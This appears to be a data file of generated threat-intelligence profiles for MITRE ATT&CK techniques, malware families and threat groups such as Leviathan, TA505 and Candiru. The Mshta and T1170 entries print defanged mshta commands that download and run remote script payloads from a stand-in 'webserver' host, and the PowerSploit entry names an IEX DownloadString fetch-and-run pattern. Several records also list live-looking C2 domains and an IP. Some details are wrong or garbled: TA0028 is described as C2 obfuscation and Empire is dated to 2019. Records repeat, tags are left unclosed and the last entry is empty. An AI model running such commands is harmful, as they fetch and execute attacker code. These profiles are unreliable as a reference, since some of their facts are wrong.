3873.name: T1539
3873.profile_without_enhance_5: [profile]Steal Web Session Cookie (T1539) is a Credential Access technique applicable across Windows, Linux, macOS, and SaaS platforms. It involves stealing session cookies from disk, browser process memory, or network traffic to gain authenticated access to web applications, often bypassing multi-factor authentication. Cookies can be harvested by malware, through malicious JavaScript execution, or via adversary-in-the-middle proxy tools like Evilginx2. The stolen cookie is subsequently used in the Web Session Cookie (T1550.004) technique for lateral movement. Associated threat groups include Kimsuky and APT42.[/profile]

3874.name: T1074
3874.profile_without_enhance_5: [profile]The entity is MITRE ATT&CK technique T1074, Data Staged, under the Collection tactic for Windows, Linux, macOS, and cloud platforms. Adversaries stage collected data in a central location, such as a specific directory or a cloud instance, prior to exfiltration to minimize connections and evade detection. Data may be copied using common shell utilities like cmd or bash, and can be combined into single files through archiving. In cloud environments, this can involve creating a new instance with less restrictive policies to mount snapshots for staging.

3875.name: Dolphin
3875.profile_without_enhance_5: [profile]Dolphin is a malware entity that targets systems in the Republic of Korea. Its key behaviors include gathering data from removable media, discovering open application windows, staging collected data, and automating exfiltration. For persistence, it uses boot or logon autostart execution, potentially leveraging vulnerabilities like CVE-2020-1380. It is designed to operate on Windows, Linux, and macOS platforms.[/profile]

3876.name: Credentials from Password Stores
3876.profile_without_enhance_5: [profile]Credentials from Password Stores, identified as T1555 under the Credential Access tactic, targets macOS, Linux, Windows, and IaaS platforms. Adversaries search for and extract credentials from common storage locations, including password managers and cloud secrets vaults. This technique is used by groups like MuddyWater, FIN6, and APT41 to obtain credentials for lateral movement and accessing restricted information.

3877.name: Steal Web Session Cookie
3877.profile_without_enhance_5: [profile]Steal Web Session Cookie (T1539) is a Credential Access technique applicable to Windows, Linux, macOS, and SaaS platforms. It involves stealing authentication session cookies from disk, browser process memory, or network traffic to impersonate authenticated users, bypassing multi-factor authentication. Common methods include malware extraction, malicious JavaScript injection, or using adversary-in-the-middle proxy frameworks like Evilginx2. The stolen cookie is then used via the Web Session Cookie (T1550.004) sub-technique for unauthorized access.

3878.name: Data Staged
3878.profile_without_enhance_5: [profile]Data Staged, also known as T1074, is a Collection tactic technique used across Windows, Linux, macOS, IaaS, and ESXi platforms. Adversaries centralize collected data in a specific location or directory before exfiltration, often using command shells like cmd or bash to copy files. Data may be kept separate or combined via archiving. In cloud environments, staging can occur within a specific virtual machine instance. This process minimizes command-and-control connections to evade detection, with groups like Scattered Spider and Volt Typhoon employing it.[/profile]

3881.name: m2rat
3881.profile_without_enhance_5: [profile]M2RAT, also known as Map2RAT, is a Remote Access Trojan (RAT) attributed to the APT37 group. It employs steganography by hiding its executable payload within JPEG files to evade detection. Its key behaviors include Input Capture for credential theft, Phishing for initial access, and modifying the Windows Registry for persistence and defense evasion. It primarily targets Windows systems and has been observed using command and scripting interpreters for execution, with associated infrastructure including the domain shacc.kr.[/profile]

3885.name: Mshta
3885.profile_without_enhance_5: [profile]Mshta, also known as T1218.005, is a Defense Evasion technique for Windows. It involves using the trusted mshta.exe utility to proxy and execute malicious code, bypassing application whitelisting and browser security. Execution can occur via inline scripts like `mshta vbscript:Close(Execute("GetObject(\"script:https[:]//webserver/payload[.]sct\")"))` or by directly calling URLs such as `mshta http[:]//webserver/payload[.]hta`. It is associated with groups like FIN7, Lazarus Group, and MuddyWater.[/profile]

3886.name: T1170
3886.profile_without_enhance_5: [profile]The entity T1170, also known as mshta, is a technique for Defense Evasion and Execution. It operates on Windows platforms by using the trusted mshta.exe utility to execute malicious Microsoft HTML Application (HTA) files or inline scripts, bypassing application whitelisting and browser security settings. Execution can be achieved via commands like `mshta vbscript:Close(Execute("GetObject(\"script:https[:]//webserver/payload[.]sct\")"))` or by directly calling a URL with `mshta http[:]//webserver/payload[.]hta`.

3887.name: T1094
3887.profile_without_enhance_5: [profile]T1094, known as Custom Command and Control Protocol, is a command and control technique under the Command and Control tactic. It involves adversaries communicating using a custom protocol instead of encapsulating data in an existing application layer protocol. Implementations include mimicking well-known protocols or developing custom protocols, including raw sockets, on top of fundamental TCP/IP or other standard network stacks.

3889.name: OpenCarrot
3889.profile_without_enhance_5: [profile]OpenCarrot is a malware entity that uses spearphishing attachments (T1566.001) for initial access and exploits client applications (T1203) for execution. It employs DLL side-loading (T1574.001) for defense evasion and keylogging (T1056.001) for credential access. The malware collects data from the local system (T1005) and communicates with infrastructure domains including yolenny.com, centos-packages.com, redhat-packages.com, dallynk.com, and 606qipai.com, with operations linked to the Russian Federation.

3905.name: T1107
3905.profile_without_enhance_5: [profile]T1107, also known as File Deletion, is a Defense Evasion technique where adversaries remove files, such as malware or tools, left on a system during an intrusion to minimize their forensic footprint. This can be done using native OS commands like DEL, utilities such as Windows Sysinternals SDelete, or other third-party deletion tools.

3906.name: T1058
3906.profile_without_enhance_5: [profile]T1058, also known as Service Registry Permissions Weakness, is a MITRE ATT&CK technique under the Persistence and Privilege Escalation tactics for Windows. It exploits weak permissions on Windows service Registry keys (HKLM\SYSTEM\CurrentControlSet\Services). Adversaries can modify a service's binPath/ImagePath to point to a malicious executable, which runs when the service starts or restarts, granting persistence and privilege escalation under the service account context (e.g., SYSTEM). They may also alter service failure parameters like FailureCommand to execute code upon service failure.

3916.name: T1481
3916.profile_without_enhance_5: [profile]T1481, known as Web Service, is a command and control technique within the MITRE Mobile-ATT&CK framework, targeting Android and iOS platforms. It involves adversaries utilizing standard web services as a communication channel to blend malicious traffic with legitimate internet activity, facilitating covert command execution and data exfiltration from compromised mobile devices.

3919.name: T1418
3919.profile_without_enhance_5: [profile]T1418, known as Software Discovery, is a discovery technique within the MITRE Mobile-ATT&CK framework targeting Android and iOS platforms. It involves adversaries enumerating software applications, including installed security tools, to gather information about the environment and identify potential vulnerabilities or targets for further exploitation.

3921.name: T1429
3921.profile_without_enhance_5: [profile]T1429, also known as Audio Capture, is a collection technique within the MITRE Mobile ATT&CK framework targeting Android and iOS platforms. It involves the adversary's capability to capture audio input from a compromised mobile device's microphone.

3922.name: T1532
3922.profile_without_enhance_5: [profile]T1532, known as Archive Collected Data, is a Collection tactic technique within the MITRE Mobile-ATT&CK framework targeting Android and iOS platforms. It involves compressing or encrypting data gathered from a compromised device into archive formats like ZIP or RAR to facilitate exfiltration. This method reduces the size and number of network transmissions, potentially evading detection by blending data into common file types.

3923.name: T1420
3923.profile_without_enhance_5: [profile]T1420, also known as File and Directory Discovery, is a discovery technique within the MITRE Mobile-ATT&CK framework targeting Android and iOS platforms. It involves adversaries enumerating files and directories on a compromised mobile device to gather information about the system and locate data of interest for further malicious activities.

3924.name: T1528
3924.profile_without_enhance_5: [profile]T1528, Steal Application Access Token, is a Credential Access technique applicable to platforms like Containers, IaaS, and SaaS. It involves adversaries stealing tokens, such as Kubernetes service account tokens from compromised containers or OAuth access tokens via malicious applications in phishing campaigns, to gain unauthorized API access and escalate privileges. This is distinct from forging new tokens like SAML.

3925.name: TA0028
3925.profile_without_enhance_5: [profile]TA0028 is an attack pattern for command and control obfuscation, aligning with the MITRE ATT&CK tactic of Command and Control. It operates across multiple platforms. The technique involves adding junk data to C2 protocols, such as appending or inserting random characters between significant data, to hinder traffic analysis and decoding efforts. This method is used by groups like APT28 to evade detection.

3926.name: T1193
3926.profile_without_enhance_5: [profile]T1193, known as Spearphishing Attachment, is a technique within the Initial Access tactic. It involves sending a targeted email with a malicious attachment, such as an Office document, executable, or PDF, that relies on user execution to open it. The email often provides a plausible reason to open the file and may include instructions to bypass protections, like a password for a compressed archive. Adversaries frequently manipulate file extensions and icons to disguise the malicious attachment.

3927.name: PowerSploit - S0194
3927.profile_without_enhance_5: [profile]PowerSploit - S0194 is a PowerShell-based post-exploitation framework, not a traditional malware family, used for reconnaissance and lateral movement. It is employed by threat groups including APT17 and APT41. Key technical behaviors include loading modules directly from GitHub via PowerShell commands like IEX (New-Object Net.WebClient).DownloadString for reconnaissance, specifically using the PowerView.ps1 module to discover domain computers. Its target platform is Windows, leveraging PowerShell for execution. Infrastructure use involves downloading scripts from public repositories like raw.githubusercontent.com.[/profile]

3928.name: Email Accounts
3928.profile_without_enhance_5: [profile]Email Accounts is a Resource Development technique (T1586.002) used by adversaries to compromise email accounts for use in operations. Methods include credential phishing, purchasing from third-party sites, brute-forcing using breached password dumps, or bribing insiders. Compromised accounts are leveraged to conduct phishing campaigns, send spam, hijack existing email threads for trust, and acquire infrastructure like domains.

3929.name: T1078.001
3929.profile_without_enhance_5: [profile]T1078.001, known as Default Accounts, is a technique within the Valid Accounts (T1078) parent. It aligns with the MITRE ATT&CK tactics of Defense Evasion, Initial Access, Persistence, and Privilege Escalation, applicable across platforms including Windows, Linux, macOS, Network Devices, and cloud services like AWS and ESXi. Adversaries abuse built-in OS accounts (e.g., Windows Guest or Administrator) or default factory/provider accounts (like the AWS root user, ESXi root, or Kubernetes default service accounts) that are not changed post-installation. This provides legitimate access for initial compromise, maintaining persistence, escalating privileges, or evading detection. The technique also extends to network appliances and applications with preset credentials, and adversaries may leverage credentials for accounts created during system integration, such as the `vpxuser` on ESXi when connected to vCenter.

3930.name: Empire - S0363
3930.profile_without_enhance_5: [profile]Empire - S0363, also known as PowerShell Empire, is a post-exploitation framework written in PowerShell and published in 2019, with BC Security developing it since 2020. It is listed in the MITRE ATT&CK database as S0363. Its features include a launcher to start an agent, available in five file types, and the ability to expand functionality with modules. Associated techniques include using external remote services (T1133) for initial access and persistence, and abusing default accounts (T1078.001). Its infrastructure or campaigns have been linked to locations including Canada, China, and the United States.[/profile]

3931.name: T1585.001
3931.profile_without_enhance_5: [profile]T1585.001 (Social Media Accounts) is a Resource Development technique within the MITRE ATT&CK framework for the PRE platform. It involves adversaries creating and cultivating social media accounts to build fictitious or impersonated personas, which are used to establish connections with targets for social engineering. These personas are developed across platforms like Facebook and LinkedIn, often requiring detailed profile information and networks to appear legitimate. The technique is employed by numerous threat groups, including Lazarus Group and APT32, and the cultivated accounts can later be leveraged for initial access operations such as spearphishing.

3932.name: T1583.001
3932.profile_without_enhance_5: [profile]The entity T1583.001, named Domains, is a Resource Development technique within the MITRE ATT&CK framework, applicable to the PRE platform. This technique involves adversaries acquiring domains for use in operations such as Phishing, Drive-by Compromise, and Command and Control. Specific mechanics include registering domains that are visually similar to legitimate ones through typosquatting, using homoglyphs, different top-level domains, or internationalized domain names (IDNs) to create deceptive lookalikes. Adversaries may also acquire expired domains to exploit existing trust, use private WHOIS services to obscure ownership, and register domains through compromised environments like AWS Route53. The technique is associated with numerous threat groups, including APT28, Lazarus Group, and FIN7.[/profile]

3933.name: Default Accounts
3933.profile_without_enhance_5: [profile]Default Accounts, identified as MITRE ATT&CK T1078.001, is a technique used for Defense Evasion, Initial Access, Persistence, and Privilege Escalation across platforms including Windows, Linux, macOS, and network/cloud services. It involves adversaries abusing built-in or factory-set credentials, such as the Windows Guest/Administrator, AWS root, ESXi root, or Kubernetes default service accounts, and preset accounts on appliances like network devices. A specific example is the privileged `vpxuser` account created when an ESXi server connects to vCenter. Attackers exploit these often unchanged default credentials to gain legitimate access, sometimes using stolen keys, and groups like FIN13 and UNC3886 have been associated with this method.

3934.name: Credentials
3934.profile_without_enhance_5: [profile]Credentials is a reconnaissance technique (Tactic: Reconnaissance, Platform: PRE) where adversaries gather account credentials to enable further attacks. They collect them through phishing, compromising websites to steal authentication cookies, purchasing from dark web markets, or exploiting leaks in online data sets like search engines, breach dumps, and code repositories. This gathered information can facilitate subsequent reconnaissance, resource establishment, or initial access.

3935.name: T1585.002
3935.profile_without_enhance_5: [profile]T1585.002, also known as Email Accounts, is a Resource Development technique within the MITRE ATT&CK framework applicable to PRE platforms. Adversaries create email accounts, potentially using disposable services to obscure attribution, to enable follow-on operations such as conducting phishing campaigns (e.g., T1566 or T1598) or acquiring other infrastructure like domains. These accounts may be cultivated with supporting personas via social media to increase effectiveness.

3936.name: Orz - S0229
3936.profile_without_enhance_5: [profile]Orz (also known as Orz - S0229) is a custom JavaScript backdoor attributed to the Leviathan APT group. It was used in operations in 2014 and again in August 2017, where it was delivered via malicious Microsoft Publisher files. The malware's neighbor associations indicate its operators utilize techniques like acquiring Domains, creating Social Media and Email Accounts, and exploiting Default Accounts for resource development and initial access, with targeting focused on locations including Canada, China, and the United States.]

3937.name: Social Media Accounts
3937.profile_without_enhance_5: [profile]Social Media Accounts is a Resource Development technique (T1585.001) on the PRE platform where adversaries create and cultivate fake or impersonated profiles on platforms like Facebook, LinkedIn, and Twitter. This involves developing a persona by filling out profile details, building social networks, and adding photos to appear legitimate. These fabricated accounts are then used to establish connections with targets, often as a precursor to social engineering attacks like spearphishing.

3938.name: Domains
3938.profile_without_enhance_5: [profile]The entity "Domains" is a Resource Development technique (T1583.001) within the MITRE ATT&CK framework, applicable to the PRE platform. Adversaries acquire domains, including through purchase or free registration, to establish infrastructure for operations like phishing, drive-by compromises, and command and control. They often select domains similar to legitimate ones using techniques like typosquatting, homoglyphs, or different top-level domains to appear trustworthy. Domains can be acquired from various registrars, and adversaries may use private WHOIS services to obscure ownership. This technique is associated with numerous threat groups, including APT28, Lazarus Group, and FIN7.

3939.name: T1589.001
3939.profile_without_enhance_5: [profile]T1589.001, also known as Credentials, is a reconnaissance technique within the MITRE ATT&CK framework, operating on the PRE platform. Adversaries gather credentials from potential victims through direct elicitation via phishing, by compromising sites to collect authentication cookies, or by accessing leaked data from sources like breach dumps, code repositories, or dark web markets. This gathered information can enable further reconnaissance, establish operational resources, or facilitate initial access.

3940.name: MURKYTOP - S0233
3940.profile_without_enhance_5: [profile]MURKYTOP - S0233, also known as murkytop, is a reconnaissance tool used by the suspected Chinese cyber espionage group Leviathan (TEMP.Periscope). It has been deployed in intrusions targeting the U.S. engineering and maritime sectors, as well as in compromises of Cambodian election entities. Its associated TTPs include the use of Social Media Accounts, Default Accounts, Credentials, Domains, and Email Accounts for resource development and initial access. Its target locations include the United States, Canada, and China.[/profile]

3941.name: NanHaiShu - S0228
3941.profile_without_enhance_5: [profile]NanHaiShu (S0228) is a remote access tool and JScript backdoor used by the Leviathan group. It targets Windows platforms, particularly at government and private-sector organizations involved in the South China Sea dispute, with victims in the United States, Canada, and China. Key behaviors include modifying the Windows Registry for persistence (using the %regrun% key) and executing additional VBScript and JScript code on infected machines. Delivery is often via emailed attachments and URLs from fraudulent lookalike domains. Associated infrastructure and tools include the use of domains, email accounts, and social media accounts for resource development.[/profile]

3942.name: gh0st RAT - S0032
3942.profile_without_enhance_5: [profile]gh0st RAT - S0032 is a remote access tool (RAT) with public source code. Aliases include gh0st rat. It has been used by multiple attributed groups including kimsuky, axiom, APT5, leviathan, higaisa, APT41, APT18, pittytiger, andariel, threat group-3390, and TA459. Its use is associated with resource development techniques like acquiring Domains, Email Accounts, and Social Media Accounts, and abusing Default Accounts for initial access and persistence. It has targeted entities in Canada, China, and the United States of America.[/profile]

3943.name: Derusbi - S0021
3943.profile_without_enhance_5: [profile]Derusbi - S0021, also known simply as Derusbi, is a malware used by multiple Chinese APT groups including APT41, Deep Panda, Axiom, and Leviathan. It has been observed in both Windows and Linux variants. Its associated techniques include the use of Social Media Accounts, Default Accounts, Credentials, Domains, and Email Accounts for resource development and initial access. Its operations have targeted locations including Canada, China, and the United States of America.

3944.name: Cobalt Strike - S0154
3944.profile_without_enhance_5: [profile]Cobalt Strike - S0154 is a malware tool used for command and control, also known simply as Cobalt Strike. It is associated with various groups including APT29, APT32, APT41, Aquatic Panda, Anunak, Codoso, CopyKittens, DarkHydrus, Earth Baxia, FIN6, FIN7, Leviathan, Mustang Panda, Shell Crew, Stone Panda, Tianwu, UNC1878, UNC2452, and the Winnti umbrella. Its key techniques include Domain Fronting (T1090.004) to obfuscate HTTPS traffic, Indicator Blocking (T1562.006) to tamper with event logging, and Indirect Command Execution (T1202) to bypass security controls. It also involves credential access through Unsecured Credentials (T1552) and Steal or Forge Kerberos Tickets (T1558). The malware targets Windows, Linux, macOS, and ESXi platforms and has been used in attacks against entities in locations like Indonesia, Malaysia, and the United Arab Emirates, often leveraging vulnerabilities such as CVE-2016-5195 and CVE-2023-32315.[/profile]

3945.name: China Chopper - S0020
3945.profile_without_enhance_5: [profile]China Chopper - S0020, also known as China Chopper, is a Web Shell hosted on web servers to provide backdoor access into enterprise networks. It has been used by threat groups including HAFNIUM, BackdoorDiplomacy, Leviathan, Mustang Panda, Gallium, APT41, Fox Kitten, Threat Group-3390, and ToddyCat. Its key behavior is providing command and control without requiring infected systems to call back to a remote server. It targets web servers and has been associated with infrastructure in Canada, China, and the United States.

3946.name: Leviathan
3946.profile_without_enhance_5: [profile]Leviathan, also known as APT40, TEMP.Periscope, G0065, and Gingham Typhoon, is a suspected Chinese cyber espionage group. Its key custom malware includes the Orz JavaScript backdoor, the NanHaiShu JScript backdoor, and the MURKYTOP reconnaissance tool, alongside the use of shared tools like Derusbi. Its TTPs involve using compromised credentials and default accounts for initial access, employing SSH and RDP for lateral movement, and leveraging domains, email, and social media accounts for resource development. The group is attributed to China and primarily targets entities in the United States, Canada, and Australia, with a focus on sectors like maritime, engineering, and government, particularly those involved in the South China Sea dispute, indicating state-aligned espionage motivations.[/profile]

3949.name: Winver.exe
3949.profile_without_enhance_5: [profile]Winver.exe is a legitimate Windows application (winver.exe) that is abused by malware for process injection. The Tinba banking trojan is known to inject its malicious code into a spawned winver.exe process. The malware exhibits behaviors including inhibiting system recovery (T1490), bypassing User Account Control, discovering security software (T1518.001), using Remote Desktop Protocol for lateral movement (T1021.001), and deploying remote access tools (T1219). Associated infrastructure includes domains like espncrics.info, daily-mashriq.org, and quranchapter.t-cdn.org, with some connections to Pakistan.

3950.name: Client.exe
3950.profile_without_enhance_5: [profile]The malware "Client.exe" is a specific sample of the Ratsnif family, also known by the filename javaw.exe. It is attributed to the APT32 group. Its key technical behaviors include using the Windows Service Control Manager for execution (T1569.002), bypassing User Account Control for privilege escalation (T1548.002), querying the Windows Registry for system discovery (T1012), discovering security software (T1063), and inhibiting system recovery by deleting Volume Shadow Copies (T1490). It targets Windows platforms and communicates with command-and-control infrastructure at domains like daily-mashriq.org and quranchapter.t-cdn.org, and IP addresses including 172.81.60.46.[/profile]

3952.name: Patchwork
3952.profile_without_enhance_5: [profile]Patchwork, also known as Quilted Tiger, Dropping Elephant, and APT-C-09, is an intrusion set attributed to Pakistan. It employs custom malware such as Client.exe (a Ratsnif variant) and abuses legitimate tools like winver.exe. Key tactics include bypassing User Account Control, inhibiting system recovery via commands like vssadmin, discovering security software, and using Remote Access Tools. The group targets Windows systems, with infrastructure linked to domains like daily-mashriq.org and quranchapter.t-cdn.org, and its primary motivation is espionage.[/profile]

3961.name: T1207
3961.profile_without_enhance_5: [profile]T1207, known as Rogue Domain Controller, is a Defense Evasion technique targeting Windows platforms. It involves adversaries registering a rogue Domain Controller (DC) using tools like DCShadow to manipulate Active Directory data, including objects and schemas, without triggering standard logging or SIEM alerts. This requires Administrator privileges or the KRBTGT hash and allows injection of changes, such as credential modifications or SID-History Injection, to establish persistence and obstruct forensic analysis.

3966.name: T1569.002
3966.profile_without_enhance_5: [profile]T1569.002, Service Execution, is a Windows-specific execution technique within the MITRE ATT&CK framework. Adversaries abuse the Windows Service Control Manager (services.exe) to run malicious commands or payloads, often using utilities like sc.exe, Net, or PsExec, which can create temporary services via the Service Control Manager API. This method is frequently employed by groups like APT38, FIN7, and Wizard Spider for remote execution, persistence, or privilege escalation.

3967.name: T1548.002
3967.profile_without_enhance_5: [profile]T1548.002 Bypass User Account Control is a Windows technique for Defense Evasion and Privilege Escalation. It exploits UAC mechanisms to elevate privileges without full user consent, often by leveraging auto-elevated programs like eventvwr.exe or Rundll32 with crafted DLLs to load elevated COM objects. Methods are extensively cataloged in resources like UACMe, and it is used by groups including APT37, APT38, and MuddyWater.

3968.name: Rogue Domain Controller
3968.profile_without_enhance_5: [profile]Rogue Domain Controller is a Defense Evasion technique (ID: T1207) on Windows platforms. It involves registering a rogue domain controller, often via tools like DCShadow, by creating server and nTDSDSA objects in the AD Configuration partition, which requires Administrator privileges or the KRBTGT hash. This allows adversaries to inject and replicate malicious changes to Active Directory objects, including credentials, while potentially bypassing SIEM logging and security monitors to obstruct forensic analysis.

3969.name: Service Execution
3969.profile_without_enhance_5: [profile]Service Execution is MITRE ATT&CK technique T1035 under the Execution tactic for Windows. It involves executing commands or payloads by interacting with the Windows Service Control Manager (services.exe). This can be achieved by creating a new service or modifying an existing one using utilities like sc.exe, Net, or PsExec, which can also facilitate remote execution. This technique is commonly used in conjunction with persistence methods like New Service (T1050) or Windows Service (T1543.003).

3970.name: Bypass User Account Control
3970.profile_without_enhance_5: [profile]Bypass User Account Control is the MITRE ATT&CK technique T1548.002 under the Defense Evasion and Privilege Escalation tactics for Windows. It involves circumventing Windows User Account Control (UAC) to elevate process privileges without proper user consent. Specific methods include exploiting auto-elevated programs like `eventvwr.exe` to execute arbitrary binaries, using tools like Rundll32 to load crafted DLLs that invoke elevated COM objects, or injecting code into trusted processes. Numerous bypass methods are cataloged in resources like UACMe, and this technique is commonly used by threat groups including APT37, MuddyWater, and APT29.

3972.name: Star Blizzard
3972.profile_without_enhance_5: [profile]Star Blizzard, also known as Callisto, ColdRiver, Iron Frontier, TA446, UNC4057, and Seaborgium, is a cyber espionage group. It primarily uses spearphishing links (T1566.002) to gain initial access, recently adopting a PDF-less approach in its campaigns. The group has been observed using domains like cache-services.live, pdf-cache.com, and proton-pdf.online in its operations. It is attributed to Russian state interests and primarily targets entities such as US think tanks for intelligence gathering.[/profile]

4125.name: ServHelper
4125.profile_without_enhance_5: [profile]ServHelper is a malware family attributed to the TA505 threat group. It downloads the FlawedGrace backdoor and uses domains like neboley.cn, teahgiaj3ig.cn, and aisiciciaisxuusuxic.xyz for command and control. Associated infrastructure includes indicators such as asfjjsdvv33gqrr2fv.cn and asfuuvhv3083f.xyz, and a related file named sep12.exe. It is technically linked to other TA505 malware like Clop and FlawedAmmyy through shared code-signing certificates.[/profile]

4128.name: TA505
4128.profile_without_enhance_5: [profile]TA505, also known as Spandex Tempest, FIN11, and Lace Tempest, is a financially motivated cybercriminal group active since at least 2014, known for frequently changing malware and driving global criminal malware trends. Its key tools and campaigns have involved the Clop ransomware and downloaders like Get2. The group primarily targets sectors globally for financial gain, using large-scale phishing and malspam campaigns to distribute its payloads. It is attributed to a Russian-speaking cybercriminal operation.

4406.name: Karkadann
4406.profile_without_enhance_5: [profile]Karkadann is a malware used in watering-hole attacks targeting websites in the Middle East, with victim locations including Yemen, Albania, Armenia, Uzbekistan, and the Russian Federation. Its campaigns share similarities with the Piwiks case. The malware's acquisition and deployment involve adversary techniques such as obtaining exploits (T1588.005), compromising servers for infrastructure (T1584.004, Server), staging drive-by compromises (Drive-by Target), and acquiring malware capabilities (T1588.001).[/profile]

4407.name: T1584.004
4407.profile_without_enhance_5: [profile]T1584.004, also known as Compromise Infrastructure: Server, is a Resource Development technique within the MITRE ATT&CK framework applicable to pre-compromise platforms. It involves adversaries compromising third-party servers to stage, launch, and execute operations, including for Command and Control, instead of purchasing infrastructure. This activity has been associated with groups such as Dragonfly, Earth Lusca, and Volt Typhoon.

4408.name: Visual Basic
4408.profile_without_enhance_5: [profile]Visual Basic is a legacy Microsoft programming language with the MITRE ATT&CK ID T1059.005, used for Execution on Windows, Linux, and macOS platforms. Adversaries abuse it for execution by writing malicious scripts or macros, particularly through its derivatives VBA (embedded in Office documents for task automation) and VBScript (a default Windows scripting language). Common attack mechanics include using VBScript to automate behaviors or embedding VBA into spearphishing attachments to execute commands, often leveraging its interoperability with Windows technologies like COM and the Native API.

4409.name: Drive-by Target
4409.profile_without_enhance_5: [profile]Drive-by Target, designated T1608.004 under the Resource Development tactic, is a preparatory technique on the PRE platform where adversaries stage malicious content on websites to facilitate Drive-by Compromise. This involves uploading or injecting malicious scripts like JavaScript into web pages, modifying files in writeable cloud storage, or crafting malicious advertisements (Malvertising) to be served through legitimate ad networks. Adversaries may also use these sites to profile a victim's browser for vulnerabilities before delivering an exploit, often targeting specific communities in strategic web compromise or watering hole attacks.

4410.name: T1588.005
4410.profile_without_enhance_5: [profile]T1588.005, known as Obtain Capabilities: Exploits, is a Resource Development technique within the MITRE ATT&CK framework applicable to the PRE platform. Adversaries acquire exploits by purchasing, stealing, or downloading them from online sources, exploit vendors, or criminal marketplaces, rather than developing them in-house. These exploits target specific vulnerabilities, such as CVE-2020-1472, to cause unintended behavior in software or hardware and are subsequently used in various operational phases like initial access or privilege escalation.

4411.name: T1588.001
4411.profile_without_enhance_5: [profile]T1588.001, also known as Malware, is a resource development technique within the MITRE ATT&CK framework. Adversaries acquire malware, including payloads, backdoors, and C2 protocols, by purchasing it from criminal marketplaces or third-party developers, stealing it from other threat actors, or downloading it freely. This obtained malware is then used to support subsequent attack stages, such as maintaining control of compromised systems. The technique is associated with threat groups including UNC3886, Metador, and APT1, and it is platform-agnostic (PRE).[/profile]

4412.name: Candiru
4412.profile_without_enhance_5: [profile]Candiru is spyware attributed to an unknown group. It primarily targets individuals via email messages containing malicious links to domains like stat[.]email for initial infection. Its infrastructure is linked to domains such as candirusecurity[.]com, and it has been observed targeting entities in locations including Albania, Yemen, Armenia, Uzbekistan, and the Russian Federation. Associated MITRE ATT&CK techniques include T1583.004 (Acquire Infrastructure: Server), T1608.004 (Drive-by Target), and the use of Exploits (T1587.004), Domains (T1583.001), and compromised Servers for staging and command and control.[/profile]

4413.name: Server
4413.profile_without_enhance_5: [profile]The entity "Server" is a Resource Development technique (T1583.004) within the MITRE ATTACK framework, applicable to the PRE platform. It involves adversaries compromising third-party servers to stage, launch, and execute operations, including for Command and Control. This method is used instead of purchasing infrastructure and can involve compromising web servers for watering hole attacks or email servers to support phishing campaigns.

4414.name: Malware
4414.profile_without_enhance_5: [profile]Malware, identified as T1587.001, is a Resource Development technique within the MITRE ATTACK framework. It involves adversaries developing malicious software components such as payloads, droppers, backdoors, and command-and-control protocols to support their operations. This development can be conducted in-house or contracted out, and may include embedding false indicators to mislead attribution.

4415.name: Candiru
4415.profile_without_enhance_5: [profile]Candiru, also known as Sourgum and Caramel Tsunami, is a spyware attributed to an unknown group, though its infrastructure and targeting show overlaps with operations in the Russian Federation. Its key malware includes its namesake Candiru spyware and the Karkadann malware used in watering-hole attacks. Key TTPs involve exploiting vulnerabilities (T1587.004), staging drive-by compromises (T1608.004), and using compromised servers (T1583.004) and acquired domains (T1583.001) for infrastructure. It primarily targets individuals via malicious email links and has been observed in campaigns affecting entities in Albania, Yemen, Armenia, Uzbekistan, and Russia, with motivations likely aligned with espionage.[/profile]

4416.name: T1608.004
4416.profile_without_enhance_5: [profile]The entity is MITRE ATT&CK technique T1608.004 Drive-by Target, under the Resource Development tactic on the PRE platform. This technique involves preparing an operational environment to infect systems via web browsing, typically by staging malicious content like JavaScript on adversary-controlled or compromised websites. This content can be injected into web pages, uploaded to cloud storage, or delivered via malicious advertisements (malvertising) to profile browsers and exploit vulnerabilities, often as part of targeted watering hole attacks. Associated threat groups include Dragonfly, FIN7, and APT32.

4417.name: Exploits
4417.profile_without_enhance_5: [profile]Exploits, also known as T1587.004, is a Resource Development technique within the MITRE ATT&CK framework on the PRE platform. It involves adversaries developing their own exploits by leveraging vulnerability information and using methods like fuzzing and patch analysis to uncover bugs, rather than acquiring them externally. These custom-developed exploits are then used across multiple attack phases, including initial access and privilege escalation. The technique is associated with groups like UNC3886, Volt Typhoon, and Leviathan, and is linked to specific vulnerabilities such as CVE-2023-22515 and CVE-2017-0144.[/profile]

4418.name: T1583.004
4418.profile_without_enhance_5: [profile]T1583.004, also known as Acquire Infrastructure: Server, is a Resource Development technique within the MITRE ATT&CK framework applicable to PRE platforms. Adversaries may buy, lease, rent, or obtain physical servers to stage, launch, and execute operations, using them for tasks like watering hole attacks, phishing, or command and control. This differs from compromising third-party servers or using virtual private servers, as it involves adversaries configuring and running their own infrastructure, potentially abusing free cloud server trials.

4424.name: WIREFIRE
4424.profile_without_enhance_5: [profile]WIREFIRE, also known as wirefire, is a Python-based web shell that trojanizes a component of the Pulse Secure appliance to enable file downloads and arbitrary command execution on the compromised device. It is associated with the threat group STORM-0249 and utilizes infrastructure domains such as duorhytm.fun, sessionserver.pl, cpanel.netbar.org, line-api.com, and miltonhouse.nl. Its techniques include deploying containers, modifying authentication processes, gathering host information, phishing for information, and acquiring infrastructure.

4425.name: BUSHWALK - S1118
4425.profile_without_enhance_5: [profile]BUSHWALK - S1118, also known as bushwalk, is a web shell written in Perl that was inserted into the legitimate querymanifest.cgi file on compromised Ivanti Connect Secure VPN appliances during the Cutting Edge campaign. It is associated with the exploitation of vulnerabilities CVE-2024-21893 and CVE-2024-21887. Its infrastructure includes domains such as log.morsag3ah.workers.de, cvedev.morsag3ah.workers.dev, morsag3ah.workers.dev, and update.morsag3ah.workers.dev.[/profile]

4426.name: BRICKSTORM
4426.profile_without_enhance_5: [profile]BRICKSTORM is a stealthy espionage backdoor attributed to the UTA0178 group. Its key behaviors include modifying authentication processes (T1556), deploying containers (T1610) for defense evasion, and exfiltrating data over web services (T1567). The malware also conducts reconnaissance by gathering victim host information (T1592) and phishing for information (T1598). It communicates with command and control infrastructure at domains such as cvedev.morsag3ah.workers.dev and update.morsag3ah.workers.dev, primarily targeting technology and legal sectors.[/profile]

4427.name: BEEFLUSH
4427.profile_without_enhance_5: [profile]BEEFLUSH, also tracked as SLAYSTYLE, is a JavaServer Pages (JSP) web shell that functions as a backdoor, deployed by threat actor UTA0178. It is designed to receive and execute arbitrary operating system commands passed through an HTTP request, with the command output returned in the HTTP response. Its infrastructure includes domains like morsag3ah.workers.dev and its subdomains. Associated techniques include deploying containers (T1610) and gathering victim host information (T1592).

4428.name: WIREFIRE - S1115
